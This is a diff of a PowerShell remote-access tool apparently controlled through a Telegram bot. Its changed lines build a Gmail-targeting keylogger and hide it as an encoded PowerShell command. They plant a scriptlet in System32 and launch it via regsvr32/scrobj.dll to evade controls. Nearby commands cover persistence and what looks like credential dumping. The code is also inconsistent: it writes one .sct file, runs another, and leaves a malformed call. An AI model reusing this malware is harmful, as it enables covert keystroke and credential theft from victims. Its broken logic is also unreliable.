@@ -264,7 +264,7 @@ function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect=
  if ($comando -like "/Persistence On") {$texto = persistence; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/Persistence Off") {$texto = remove-persistence; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -eq "/KeyLogger_Selective") {$texto = "Activa un KeyLogger de manera selectiva.`n Ejemplo: /KeyLogger_Selective facebook"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
- if ($comando -like "/KeyLogger_Selective *") {$comando = $comando -replace "/KeyLogger_Selective ",""; $code = crea_keylogger -extrae gmail ; code_a_base64 -code $code; $code = "powershell.exe -win hidden -enc " + $code
+ if ($comando -like "/KeyLogger_Selective *") {$comando = $comando -replace "/KeyLogger_Selective ",""; $code = crea_keylogger -extrae gmail ; $code = code_a_base64 -code $code; $code = "powershell.exe -win hidden -enc " + $code
 $plantilla_sct = '<?XML version="1.0"?>
 <scriptlet>
 <registration
@@ -284,7 +284,7 @@ classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
 </public>
 </scriptlet>'
 $plantilla_sct | Out-File -Encoding ascii "C:\Windows\System32\update.sct" 
-$plantilla_sct | Out-File -Encoding ascii "C:\Windows\System32\update.sct"  ; Start-Process c:\windows\system32\regsvr32.exe -ArgumentList '/s /n /u /i:c:\windows\system32\log.sct scrobj.dll' ;$texto = "Lanzado Keylogger_Selective $comando" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
+$plantilla_sct | Out-File -Encoding ascii "C:\Windows\System32\update.sct"  ;  c:\windows\system32\regsvr32.exe -ArgumentList '/s /n /u /i:c:\windows\system32\log.sct scrobj.dll' ;$texto = "Lanzado Keylogger_Selective $comando" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
  if ($comando -like "/MimiGatoz") {mimigatoz}
 
 }
